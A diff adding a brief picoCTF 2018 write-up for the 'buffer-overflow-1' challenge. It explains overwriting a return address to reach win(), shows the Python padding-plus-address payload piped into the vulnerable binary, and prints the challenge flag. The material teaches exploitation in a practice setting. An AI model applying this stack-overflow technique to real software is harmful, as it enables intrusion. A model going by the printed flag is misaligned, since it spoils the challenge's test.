@@ -1,0 +1,8 @@
+Looking at the source code, we need to overflow the buffer and overwrite the return address of the function,
+which the code will then jump to and execute. Using gdb, we can find that the address of the
+win() function is located at 0x80485cb, which we encode as little endian as a part of our overflow payload.
+
+james9909@pico-2018-shell-3:/problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613$ python -c "print 'A'*44 + '\xcb\x85\x04\x08'" | ./vuln
+Please enter your string:
+Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
+picoCTF{addr3ss3s_ar3_3asy3656a9b3}Segmentation fault
